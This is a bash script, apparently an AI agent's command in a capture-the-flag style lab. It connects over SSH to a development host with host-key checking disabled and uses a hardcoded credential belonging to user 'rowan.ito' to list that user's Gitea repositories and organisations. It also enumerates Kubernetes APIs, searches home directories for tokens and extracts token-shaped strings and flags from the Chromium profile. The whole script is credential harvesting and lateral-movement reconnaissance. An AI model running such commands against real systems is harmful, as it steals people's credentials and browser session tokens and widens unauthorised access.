set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
G=https://source.keplerops.test
U='rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo'
echo "=== GITEA USER/ORGS ==="
curl -sSk -m 10 -u "$U" "$G/api/v1/user" | head -c 500; echo
curl -sSk -m 10 -u "$U" "$G/api/v1/orgs" | head -c 800; echo
curl -sSk -m 10 -u "$U" "$G/api/v1/user/repos?limit=50" | python3 -c 'import sys,json; d=json.load(sys.stdin); print("\n".join(r["full_name"] for r in d))' 2>&1 | head -60
echo "=== GITEA SEARCH repos ==="
for q in cloud workload trust identity export support fieldlink fieldkest; do
 echo "-- q=$q"
 curl -sSk -m 10 -u "$U" "$G/api/v1/repos/search?q=$q&limit=30" | python3 -c 'import sys,json;
try:
 d=json.load(sys.stdin); print(" ".join(r["full_name"] for r in d.get("data",[])))
except Exception as e: print("ERR",e)' 2>&1 | head -5
done
echo "=== K8S DISCOVERY ==="
kubectl get --raw /apis 2>&1 | head -c 2500; echo
kubectl api-resources --namespaced=true 2>&1 | head -40
kubectl api-resources --namespaced=false 2>&1 | head -30
echo "=== K8S RAW APIS/GROUPS ==="
for g in "" apps batch cloud.keplerops.test keplerops.io identity.keplerops.test workloads.keplerops.test; do
 echo "-- /apis/$g"; kubectl get --raw "/apis/$g" 2>&1 | head -c 600; echo
done
echo "=== SEARCH HOME FOR TOKENS ==="
grep -rIl -i -E 'workload|trust|audience|token-exchange|fk_|bearer' ~/.config ~/.local ~/work 2>/dev/null | head -30
echo "=== CHROMIUM TOKENS ==="
find ~/.config/chromium -type f -maxdepth 3 2>/dev/null | head -20
grep -aEo 'fk_[A-Za-z0-9_-]{10,}|FLAG\{[0-9a-f]{16}\}|eyJ[A-Za-z0-9_.-]{20,}' ~/.config/chromium/Default/* 2>/dev/null | head -20
RSH
echo DONE_K14_R4
